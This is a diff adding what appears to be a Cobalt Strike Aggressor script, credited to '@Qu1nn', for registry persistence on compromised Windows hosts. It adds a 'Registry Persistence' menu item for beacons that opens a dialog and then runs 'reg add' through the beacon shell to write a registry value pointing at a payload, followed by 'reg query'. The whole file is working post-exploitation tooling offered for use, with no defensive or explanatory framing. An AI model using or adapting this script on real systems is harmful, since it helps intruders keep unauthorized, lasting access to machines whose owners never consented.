@@ -1,0 +1,34 @@
+#Registry Persistence
+#Author: @Qu1nn
+#Depending on Registry Location elevated access might be required
+
+sub persistRegistry {
+	$bid = $1;
+	$dialog = dialog("Registry Persistence", %(reglocation => "Registry Location..", keyname => "Key Name..", datatype => "Data Type..(REG_SZ)", keyvalue => "Key Value..(Payload)"), lambda({
+		if ("$3['reglocation']" ismatch 'Registry Location..' || "$3['keyname']" ismatch 'Key Name..' || "$3['datatype']" ismatch 'Data Type..(REG_SZ)' || "$3['keyvalue']" ismatch 'Key Value..(Payload)') {
+			berror($bid, "\c4Please enter a valid Registry Location, Key Name, Key Type, and a valid Payload Location.");
+			break;
+		}
+		else {
+			bshell($bid, 'reg add "'.$3['reglocation'].'" /v "'.$3['keyname'].'" /t "'.$3['datatype'].'" /d "'.$3['keyvalue'].'" /f');
+			bshell($bid, 'reg query "'.$3['reglocation'].'"');
+		}
+	}));
+
+	dialog_description($dialog, "Registry Persistence - Creates a custom Registry Entry for persistence on selected beacon. **HKLM\\ could require elevated access.");
+	
+	drow_text($dialog, "reglocation",  "Registry Location:");
+	drow_text($dialog, "keyname", "Registry Key Name:");
+	drow_text($dialog, "datatype", "Registry Key Type:");
+	drow_text($dialog, "keyvalue", "Registry Key Value..(Payload Location):");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+popup beacon_bottom {
+	item "Registry Persistence" {
+		persistRegistry($1);
+	}
+}
